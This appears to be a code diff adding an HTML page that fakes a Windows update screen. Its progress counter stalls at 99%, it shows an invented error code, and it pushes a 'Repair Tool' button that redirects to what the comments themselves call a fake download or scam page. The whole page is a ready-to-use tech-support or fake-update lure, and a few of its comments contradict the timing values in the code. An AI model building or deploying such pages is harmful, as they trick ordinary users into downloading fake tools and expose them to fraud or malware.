@@ -1,0 +1,189 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Configuring Windows Updates</title>
+    <style>
+      @keyframes spin {
+        0% {
+          transform: rotate(0deg);
+        }
+        100% {
+          transform: rotate(360deg);
+        }
+      }
+
+      @keyframes fadeIn {
+        from {
+          opacity: 0;
+          transform: translateY(10px);
+        }
+        to {
+          opacity: 1;
+          transform: translateY(0);
+        }
+      }
+
+      body,
+      html {
+        height: 100%;
+        margin: 0;
+        padding: 0;
+        background-color: #0078d4; /* Windows blue */
+        color: #ffffff;
+        font-family: "Segoe UI", Arial, sans-serif;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        text-align: center;
+        overflow: hidden; /* Prevent scrollbars */
+        cursor: none; /* Hide cursor like a real update screen */
+      }
+
+      .update-container {
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+      }
+
+      .spinner {
+        border: 5px solid rgba(255, 255, 255, 0.3);
+        border-radius: 50%;
+        border-top: 5px solid #ffffff;
+        width: 60px;
+        height: 60px;
+        animation: spin 1s linear infinite;
+        margin-bottom: 30px;
+      }
+
+      .error-icon {
+        font-size: 60px;
+        color: #ffcc00; /* Warning yellow */
+        margin-bottom: 20px;
+        display: none; /* Hidden initially */
+        animation: fadeIn 0.5s ease-out;
+      }
+
+      .status-text {
+        font-size: 1.8em;
+        margin-bottom: 15px;
+      }
+
+      .percentage {
+        font-size: 1.8em; /* Same size as status text */
+        font-weight: 300;
+        margin-bottom: 35px;
+      }
+
+      .instruction-text {
+        font-size: 1.1em;
+        font-weight: 300;
+      }
+
+      .error-message {
+        margin-top: 25px;
+        font-size: 1.1em;
+        color: #ffdddd; /* Lighter red for visibility */
+        display: none; /* Hidden initially */
+        animation: fadeIn 0.5s ease-out;
+        max-width: 450px;
+        line-height: 1.4;
+      }
+
+      .download-button {
+        display: none; /* Hidden initially */
+        margin-top: 30px;
+        padding: 12px 30px;
+        font-size: 1em;
+        font-weight: 500;
+        color: #0078d4;
+        background-color: #ffffff;
+        border: none;
+        border-radius: 3px;
+        cursor: pointer; /* Show cursor only for the button */
+        animation: fadeIn 0.5s ease-out 0.3s; /* Delayed fade-in */
+        animation-fill-mode: backwards; /* Apply start style before animation */
+        transition: background-color 0.2s, transform 0.1s;
+      }
+
+      .download-button:hover {
+        background-color: #e6e6e6;
+      }
+
+      .download-button:active {
+        transform: scale(0.98);
+      }
+    </style>
+  </head>
+  <body>
+    <div class="update-container">
+      <div class="spinner" id="spinner"></div>
+      <div class="error-icon" id="error-icon">⚠️</div>
+      <div class="status-text" id="status-text">Working on updates</div>
+      <div class="percentage" id="percentage">0% complete</div>
+      <div class="instruction-text" id="instruction-text">
+        Don't turn off your PC. This will take a while.
+      </div>
+      <div class="error-message" id="error-message">
+        Update failed (Error Code: 0x8007042c). Important system files could not
+        be updated.<br />
+        Download the Windows Update Repair Tool to resolve this issue and
+        protect your system.
+      </div>
+      <button class="download-button" id="download-button">
+        Use Repair Tool
+      </button>
+    </div>
+
+    <script>
+      const percentageElement = document.getElementById("percentage");
+      const statusElement = document.getElementById("status-text");
+      const instructionElement = document.getElementById("instruction-text");
+      const spinnerElement = document.getElementById("spinner");
+      const errorMessageElement = document.getElementById("error-message");
+      const downloadButtonElement = document.getElementById("download-button");
+      const errorIconElement = document.getElementById("error-icon");
+      let percentage = 0;
+      let intervalId;
+
+      function updateProgress() {
+        percentage += Math.floor(Math.random() * 10) + 1; // Increment randomly
+
+        if (percentage >= 99) {
+          percentage = 99; // Cap at 99%
+          percentageElement.textContent = `${percentage}% complete`;
+          clearInterval(intervalId); // Stop the regular interval
+          showError();
+        } else {
+          percentageElement.textContent = `${percentage}% complete`;
+        }
+      }
+
+      function showError() {
+        // Wait a bit before showing the error
+        setTimeout(() => {
+          statusElement.textContent = "Update Installation Failed";
+          percentageElement.style.display = "none"; // Hide percentage
+          instructionElement.style.display = "none"; // Hide original instruction
+          spinnerElement.style.display = "none"; // Hide spinner
+          errorIconElement.style.display = "block"; // Show error icon
+
+          errorMessageElement.style.display = "block";
+          downloadButtonElement.style.display = "inline-block";
+          document.body.style.cursor = "default"; // Restore cursor
+        }, 2000); // Wait 4 seconds after hitting 99%
+      }
+
+      // Start the update simulation
+      intervalId = setInterval(updateProgress, 300); // Update progress roughly every 350ms
+
+      // Link the button to another Tetapux page (e.g., fake download or RAM page)
+      downloadButtonElement.addEventListener("click", () => {
+        // Redirect to a fake download page or another scam page
+        // Using freeram.html as an example placeholder
+        window.location.href = "/red/winSec-o.html";
+      });
+    </script>
+  </body>
+</html>
